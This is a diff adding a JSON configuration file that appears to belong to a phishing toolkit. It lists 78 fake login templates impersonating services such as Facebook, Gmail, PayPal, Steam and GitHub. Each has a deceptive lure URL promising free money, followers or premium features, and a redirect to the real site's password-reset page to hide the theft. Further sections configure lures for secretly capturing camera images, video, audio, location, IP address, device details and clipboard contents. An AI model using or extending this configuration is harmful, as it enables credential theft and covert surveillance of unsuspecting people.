@@ -1,0 +1,669 @@
+{
+  "Login": [
+    {
+      "name": "Facebook Traditional",
+      "choice": "1",
+      "folder": "login_facebook",
+      "otp_folder": "login_facebook_otp",
+      "mask": "https://blue-verified-facebook-free",
+      "redirect": "https://facebook.com/recover/initiate/"
+    },
+    {
+      "name": "Facebook Voting",
+      "choice": "2",
+      "folder": "login_fb_advanced",
+      "mask": "https://vote-for-the-best-social-media",
+      "redirect": "https://facebook.com/recover/initiate/"
+    },
+    {
+      "name": "Facebook Security",
+      "choice": "3",
+      "folder": "login_fb_security",
+      "mask": "https://make-your-facebook-secured-and-free-from-hackers",
+      "redirect": "https://facebook.com/recover/initiate/"
+    },
+    {
+      "name": "Messenger",
+      "choice": "4",
+      "folder": "login_messenger",
+      "mask": "https://get-messenger-premium-features-free",
+      "redirect": "https://facebook.com/recover/initiate/"
+    },
+    {
+      "name": "Instagram Traditional",
+      "choice": "5",
+      "folder": "login_instagram",
+      "otp_folder": "login_instagram_otp",
+      "mask": "https://get-unlimited-followers-for-instagram",
+      "redirect": "https://instagram.com"
+    },
+    {
+      "name": "Insta Auto Followers",
+      "choice": "6",
+      "folder": "login_ig_followers",
+      "mask": "https://get-unlimited-followers-for-instagram",
+      "redirect": "https://skweezer.net"
+    },
+    {
+      "name": "Insta 1000 Followers",
+      "choice": "7",
+      "folder": "login_insta_followers",
+      "mask": "https://get-1000-followers-for-instagram",
+      "redirect": "https://instagram.com"
+    },
+    {
+      "name": "Insta Blue Verify",
+      "choice": "8",
+      "folder": "login_ig_verify",
+      "mask": "https://blue-badge-verify-for-instagram-free",
+      "redirect": "https://instagram.com"
+    },
+    {
+      "name": "Gmail Old",
+      "choice": "9",
+      "folder": "login_google_old",
+      "mask": "https://get-unlimited-google-drive-free",
+      "redirect": "https://accounts.google.com/signin/v2/recoveryidentifier"
+    },
+    {
+      "name": "Gmail New",
+      "choice": "10",
+      "folder": "login_google",
+      "otp_folder": "login_google_otp",
+      "mask": "https://get-unlimited-google-drive-free",
+      "redirect": "https://accounts.google.com/signin/v2/recoveryidentifier"
+    },
+    {
+      "name": "Gmail Poll",
+      "choice": "11",
+      "folder": "login_google_poll",
+      "mask": "https://vote-for-the-best-social-media",
+      "redirect": "https://accounts.google.com/signin/v2/recoveryidentifier"
+    },
+    {
+      "name": "Microsoft",
+      "choice": "12",
+      "folder": "login_microsoft",
+      "mask": "https://unlimited-onedrive-space-for-free",
+      "redirect": "https://account.live.com/ResetPassword.aspx"
+    },
+    {
+      "name": "Netflix",
+      "choice": "13",
+      "folder": "login_netflix",
+      "otp_folder": "login_netflix_otp",
+      "mask": "https://upgrade-your-netflix-plan-free",
+      "redirect": "https://www.netflix.com/us/LoginHelp"
+    },
+    {
+      "name": "Paypal",
+      "choice": "14",
+      "folder": "login_paypal",
+      "otp_folder": "login_paypal_otp",
+      "mask": "https://get-500-usd-free-to-your-account",
+      "redirect": "https://www.paypal.com/authflow/password-recovery/"
+    },
+    {
+      "name": "Steam",
+      "choice": "15",
+      "folder": "login_steam",
+      "mask": "https://steam-500-usd-gift-card-free",
+      "redirect": "https://help.steampowered.com/en/wizard/HelpWithLoginInfo/"
+    },
+    {
+      "name": "Twitter",
+      "choice": "16",
+      "folder": "login_twitter",
+      "otp_folder": "login_twitter_otp",
+      "mask": "https://get-blue-badge-on-twitter-free",
+      "redirect": "https://twitter.com/account/begin_password_reset"
+    },
+    {
+      "name": "PlayStation",
+      "choice": "17",
+      "folder": "login_playstation",
+      "mask": "https://playstation-500-usd-gift-card-free",
+      "redirect": "https://id.sonyentertainmentnetwork.com/signin/?"
+    },
+    {
+      "name": "TikTok",
+      "choice": "18",
+      "folder": "login_tiktok",
+      "otp_folder": "login_tiktok_otp",
+      "mask": "https://tiktok-free-liker",
+      "redirect": "https://www.tiktok.com/login/email/forget-password"
+    },
+    {
+      "name": "Twitch",
+      "choice": "19",
+      "folder": "login_twitch",
+      "otp_folder": "login_twitch_otp",
+      "mask": "https://unlimited-twitch-tv-user-for-free",
+      "redirect": "https://passport.twitch.tv/password_resets/new?"
+    },
+    {
+      "name": "Pinterest",
+      "choice": "20",
+      "folder": "login_pinterest",
+      "mask": "https://get-a-premium-plan-for-pinterest-free",
+      "redirect": "https://www.pinterest.com/password/reset/"
+    },
+    {
+      "name": "SnapChat",
+      "choice": "21",
+      "folder": "login_snapchat",
+      "otp_folder": "login_snapchat_otp",
+      "mask": "https://view-locked-snapchat-accounts-secretly",
+      "redirect": "https://accounts.snapchat.com/accounts/password_reset_options"
+    },
+    {
+      "name": "LinkedIn",
+      "choice": "22",
+      "folder": "login_linkedin",
+      "otp_folder": "login_linkedin_otp",
+      "mask": "https://get-a-premium-plan-for-linkedin-free",
+      "redirect": "https://www.linkedin.com/login"
+    },
+    {
+      "name": "Ebay",
+      "choice": "23",
+      "folder": "login_ebay",
+      "otp_folder": "login_ebay_otp",
+      "mask": "https://get-500-usd-free-to-your-account",
+      "redirect": "https://www.ebay.com/signin"
+    },
+    {
+      "name": "Quora",
+      "choice": "24",
+      "folder": "login_quora",
+      "mask": "https://quora-premium-for-free",
+      "redirect": "https://help.quora.com/hc/en-us/articles/115004232866-How-do-I-change-or-reset-my-password-on-Quora-"
+    },
+    {
+      "name": "Protonmail",
+      "choice": "25",
+      "folder": "login_protonmail",
+      "mask": "https://protonmail-pro-basics-for-free",
+      "redirect": "https://mail.protonmail.com/login"
+    },
+    {
+      "name": "Spotify",
+      "choice": "26",
+      "folder": "login_spotify",
+      "mask": "https://convert-your-account-to-spotify-premium",
+      "redirect": "https://www.spotify.com/password-reset/"
+    },
+    {
+      "name": "Reddit",
+      "choice": "27",
+      "folder": "login_reddit",
+      "mask": "https://reddit-official-verified-member-badge",
+      "redirect": "https://www.reddit.com/password"
+    },
+    {
+      "name": "Adobe",
+      "choice": "28",
+      "folder": "login_adobe",
+      "mask": "https://get-adobe-lifetime-pro-membership-free",
+      "redirect": "https://adobe.ly/2OE9ZKL"
+    },
+    {
+      "name": "DevianArt",
+      "choice": "29",
+      "folder": "login_deviantart",
+      "mask": "https://get-500-usd-free-to-your-acount",
+      "redirect": "https://www.deviantart.com/users/forgot/"
+    },
+    {
+      "name": "Badoo",
+      "choice": "30",
+      "folder": "login_badoo",
+      "mask": "https://get-500-usd-free-to-your-acount",
+      "redirect": "https://badoo.com/forgot/"
+    },
+    {
+      "name": "Clash Of Clans",
+      "choice": "31",
+      "folder": "login_clashofclans",
+      "mask": "https://get-unlimited-gems-in-your-coc-account",
+      "redirect": "https://www.supercell.com"
+    },
+    {
+      "name": "Ajio",
+      "choice": "32",
+      "folder": "login_ajio",
+      "mask": "https://get-limited-time-discount",
+      "redirect": "https://www.ajio.com/"
+    },
+    {
+      "name": "JioRouter",
+      "choice": "33",
+      "folder": "login_jiorouter",
+      "mask": "https://get-premium-membership-free",
+      "redirect": "https://www.jio.com/welcome"
+    },
+    {
+      "name": "FreeFire",
+      "choice": "34",
+      "folder": "login_freefire",
+      "mask": "https://get-unlimited-diamonds-in-your-ff-account",
+      "redirect": "https://ff.garena.com/"
+    },
+    {
+      "name": "Pubg",
+      "choice": "35",
+      "folder": "login_pubg",
+      "mask": "https://get-unlimited-diamonds-in-your-pubg-account",
+      "redirect": "https://www.pubgmobile.com"
+    },
+    {
+      "name": "Telegram",
+      "choice": "36",
+      "folder": "login_telegram",
+      "otp_folder": "login_telegram_otp",
+      "mask": "https://get-premium-membership-free",
+      "redirect": "https://telegram.org/"
+    },
+    {
+      "name": "Youtube",
+      "choice": "37",
+      "folder": "login_youtube",
+      "mask": "https://get-1k-like-in-any-video",
+      "redirect": "https://studio.youtube.com/"
+    },
+    {
+      "name": "Airtel",
+      "choice": "38",
+      "folder": "login_airtelsim",
+      "mask": "https://get-500-cureency-free-to-your-account",
+      "redirect": "https://www.airtel.in/"
+    },
+    {
+      "name": "SocialClub",
+      "choice": "39",
+      "folder": "login_socialclub",
+      "mask": "https://get-premium-membership-free",
+      "redirect": "https://signin.rockstargames.com/"
+    },
+    {
+      "name": "Ola",
+      "choice": "40",
+      "folder": "login_ola",
+      "mask": "https://book-a-cab-in-discount",
+      "redirect": "https://www.olacabs.com/"
+    },
+    {
+      "name": "Outlook",
+      "choice": "41",
+      "folder": "login_outlook",
+      "mask": "https://grab-mail-from-anyother-outlook-account-free",
+      "redirect": "https://outlook.live.com/owa/"
+    },
+    {
+      "name": "Amazon",
+      "choice": "42",
+      "folder": "login_amazon",
+      "mask": "https://get-limited-time-discount-free",
+      "redirect": "https://www.amazon.in/"
+    },
+    {
+      "name": "Origin",
+      "choice": "43",
+      "folder": "login_origin",
+      "mask": "https://get-500-usd-free-to-your-acount",
+      "redirect": "https://signin.ea.com/p/originX/resetPassword?execution=e1430406479s1"
+    },
+    {
+      "name": "DropBox",
+      "choice": "44",
+      "folder": "login_dropbox",
+      "mask": "https://get-1TB-cloud-storage-free",
+      "redirect": "https://www.dropbox.com/forgot/"
+    },
+    {
+      "name": "Yahoo",
+      "choice": "45",
+      "folder": "login_yahoo",
+      "mask": "https://grab-mail-from-anyother-yahoo-account-free",
+      "redirect": "https://login.yahoo.com/account/challenge/session-expired"
+    },
+    {
+      "name": "WordPress",
+      "choice": "46",
+      "folder": "login_wordpress",
+      "mask": "https://unlimited-wordpress-traffic-free",
+      "redirect": "https://google.com"
+    },
+    {
+      "name": "Yandex",
+      "choice": "47",
+      "folder": "login_yandex",
+      "mask": "https://grab-mail-from-anyother-yandex-account-free",
+      "redirect": "https://passport.yandex.com/restoration"
+    },
+    {
+      "name": "StackOverflow",
+      "choice": "48",
+      "folder": "login_stackoverflow",
+      "mask": "https://get-stackoverflow-lifetime-pro-membership-free",
+      "redirect": "https://stackoverflow.com/users/account-recovery"
+    },
+    {
+      "name": "VK",
+      "choice": "49",
+      "folder": "login_vk",
+      "mask": "https://vk-premium-real-method-2020",
+      "redirect": "https://vk.com/restore/"
+    },
+    {
+      "name": "VK Poll",
+      "choice": "50",
+      "folder": "login_vk_poll",
+      "mask": "https://vote-for-the-best-social-media",
+      "redirect": "https://vk.com/restore/"
+    },
+    {
+      "name": "Xbox",
+      "choice": "51",
+      "folder": "login_xbox",
+      "mask": "https://get-500-usd-free-to-your-acount",
+      "redirect": "https://login.live.com/login.srf"
+    },
+    {
+      "name": "Mediafire",
+      "choice": "52",
+      "folder": "login_mediafire",
+      "mask": "https://get-1TB-on-mediafire-free",
+      "redirect": "https://www.mediafire.com/login/"
+    },
+    {
+      "name": "Gitlab",
+      "choice": "53",
+      "folder": "login_gitlab",
+      "mask": "https://get-1k-followers-on-gitlab-free",
+      "redirect": "https://gitlab.com/users/password/new"
+    },
+    {
+      "name": "Github",
+      "choice": "54",
+      "folder": "login_github",
+      "otp_folder": "login_github_otp",
+      "mask": "https://get-1k-followers-on-github-free",
+      "redirect": "https://github.com/password_reset"
+    },
+    {
+      "name": "Apple",
+      "choice": "55",
+      "folder": "login_apple",
+      "mask": "https://get-apple-premium-account-free",
+      "redirect": "https://icloud.com"
+    },
+    {
+      "name": "iCloud",
+      "choice": "56",
+      "folder": "login_icloud",
+      "mask": "https://unlimited-storage-icloud-free",
+      "redirect": "https://www.apple.com"
+    },
+    {
+      "name": "Vimeo",
+      "choice": "57",
+      "folder": "login_vimeo",
+      "mask": "https://get-premium-membership-free",
+      "redirect": "https://vimeo.com/forgot_password"
+    },
+    {
+      "name": "Myspace",
+      "choice": "58",
+      "folder": "login_myspace",
+      "mask": "https://get-1k-followers-on-myspace-free-free",
+      "redirect": "https://myspace.com"
+    },
+    {
+      "name": "Venmo",
+      "choice": "59",
+      "folder": "login_venmo",
+      "mask": "https://get-500-usd-free-to-your-account",
+      "redirect": "https://account.venmo.com/password-reset"
+    },
+    {
+      "name": "Cryptocurrency",
+      "choice": "60",
+      "folder": "login_cryptocurrency",
+      "mask": "https://get-bitcoins-free",
+      "redirect": "https://expertoption.com/login"
+    },
+    {
+      "name": "SnapChat2",
+      "choice": "61",
+      "folder": "login_snapchat2",
+      "mask": "https://view-locked-snapchat-accounts-secretly",
+      "redirect": "https://accounts.snapchat.com/accounts/login"
+    },
+    {
+      "name": "Verizon",
+      "choice": "62",
+      "folder": "login_verizon",
+      "mask": "https://get-verizon-premium-account-free",
+      "redirect": "https://secure.verizon.com/account/forgot-password/start"
+    },
+    {
+      "name": "Wi-Fi",
+      "choice": "63",
+      "folder": "login_wifi",
+      "mask": "https://reconnect-your-wifi",
+      "redirect": "https://www.google.com"
+    },
+    {
+      "name": "Discord",
+      "choice": "64",
+      "folder": "login_discord",
+      "mask": "https://security-bot-for-your-discord-free",
+      "redirect": "https://www.discord.com"
+    },
+    {
+      "name": "Roblox",
+      "choice": "65",
+      "folder": "login_roblox",
+      "mask": "https://play-premium-games-for-free",
+      "redirect": "https://www.roblox.com/login/forgot-password-or-username"
+    },
+    {
+      "name": "UberEats",
+      "choice": "66",
+      "folder": "login_uber_eats",
+      "mask": "https://get-premium-membership-free",
+      "redirect": "https://www.ubereats.com/en-IN/"
+    },
+    {
+      "name": "Zomato",
+      "choice": "67",
+      "folder": "login_zomato",
+      "mask": "https://get-50%-discount-on-any-sale",
+      "redirect": "https://www.zomato.com"
+    },
+    {
+      "name": "WhatsApp",
+      "choice": "68",
+      "folder": "login_whatsapp",
+      "mask": "https://get-premium-membership-free",
+      "redirect": "https://web.whatsapp.com"
+    },
+    {
+      "name": "PayTM",
+      "choice": "69",
+      "folder": "login_paytm",
+      "mask": "https://play-premium-games-for-free",
+      "redirect": "https://paytm.com"
+    },
+    {
+      "name": "PhonePay",
+      "choice": "70",
+      "folder": "login_phonepay",
+      "mask": "https://get-50%-discount-on-any-sale",
+      "redirect": "https://www.phonepe.com"
+    },
+    {
+      "name": "MobikWik",
+      "choice": "71",
+      "folder": "login_mobikwik",
+      "mask": "https://get-premium-membership-free",
+      "redirect": "https://www.mobikwik.com"
+    },
+    {
+      "name": "Hotstar",
+      "choice": "72",
+      "folder": "login_hotstar",
+      "mask": "https://get-premium-membership-free",
+      "redirect": "https://www.hotstar.com/in"
+    },
+    {
+      "name": "FlipCart",
+      "choice": "73",
+      "folder": "login_flipcart",
+      "mask": "https://get-50%-discount-on-any-sale",
+      "redirect": "https://www.flipkart.com"
+    },
+    {
+      "name": "Teachable",
+      "choice": "74",
+      "folder": "login_teachable",
+      "mask": "https://get-premium-membership-free",
+      "redirect": "https://sso.teachable.com/secure/teachable_accounts/sign_in"
+    },
+    {
+      "name": "Mail",
+      "choice": "75",
+      "folder": "login_mail",
+      "mask": "https://get-premium-membership-free",
+      "redirect": "https://support.mail.com"
+    },
+    {
+      "name": "CryptoAir",
+      "choice": "76",
+      "folder": "login_cryptoair",
+      "mask": "https://get-premium-membership-free",
+      "redirect": "https://cryptoair.ltd/?a=forgot_password"
+    },
+    {
+      "name": "Amino",
+      "choice": "77",
+      "folder": "login_amino",
+      "mask": "https://get-premium-membership-free"
+    },
+    {
+      "name": "Custom",
+      "choice": "78",
+      "folder": "login_custom",
+      "mask": "custom"
+    }
+  ],
+  "Image": [
+    {
+      "name": "Jio Recharge",
+      "choice": "1",
+      "folder": "image_jio",
+      "mask": "https://free-399rs-jio-recharge"
+    },
+    {
+      "name": "Festival",
+      "choice": "2",
+      "folder": "image_fest",
+      "mask": "https://best-wishes-to-you"
+    },
+    {
+      "name": "Youtube Live",
+      "choice": "3",
+      "folder": "image_yt",
+      "mask": "https://watch-youtube-videos-live"
+    },
+    {
+      "name": "Online Meeting",
+      "choice": "4",
+      "folder": "image_om",
+      "mask": "https://join-zoom-online-meeting"
+    }
+  ],
+  "Video": [
+    {
+      "name": "Selfie Filter৭",
+      "choice": "1",
+      "folder": "video_selfil",
+      "mask": "https://take-selfie-with-premium-filters"
+    },
+    {
+      "name": "Online Meeting",
+      "choice": "2",
+      "folder": "video_om",
+      "mask": "https://join-zoom-online-meeting"
+    }
+  ],
+  "Audio": [
+    {
+      "name": "Selfie Filter",
+      "choice": "1",
+      "folder": "audio_selfil",
+      "mask": "https://take-selfie-with-premium-filters"
+    },
+    {
+      "name": "Online Meeting",
+      "choice": "2",
+      "folder": "audio_om",
+      "mask": "https://join-zoom-online-meeting"
+    }
+  ],
+  "Location": [
+    {
+      "name": "Weather",
+      "choice": "1",
+      "folder": "location_weather",
+      "mask": "https://get-current-weather-info",
+      "redirect": "https://www.accuweather.com"
+    },
+    {
+      "name": "NearYou",
+      "choice": "2",
+      "folder": "location_nearyou",
+      "mask": "https://meet-new-people-near-you",
+      "redirect": "https://nearyou.app"
+    },
+    {
+      "name": "Zoom",
+      "choice": "3",
+      "folder": "location_zoom",
+      "mask": "https://join-zoom-online-meeting",
+      "redirect": "https://zoom.us/support/down4j?from=launch&u=zoomus%3A%2F%2Fzoom.us%2Fjoin"
+    },
+    {
+      "name": "Google Drive",
+      "choice": "4",
+      "folder": "location_gdrive",
+      "mask": "https://download-the-file",
+      "redirect": "https://drive.google.com"
+    }
+  ],
+  "IP Tracker": [
+    {
+      "name": "IP Tracker",
+      "choice": "1",
+      "folder": "iptracker_normal",
+      "redirect": "https://age.ninja"
+    }
+  ],
+  "Device": [
+    {
+      "name": "Device",
+      "choice": "1",
+      "folder": "device_normal",
+      "redirect": "https://age.ninja"
+    }
+  ],
+  "ClipBoard": [
+    {
+      "name": "ClipBoard",
+      "choice": "1",
+      "folder": "clipboard_normal",
+      "redirect": "https://age.ninja"
+    }
+  ]
+}
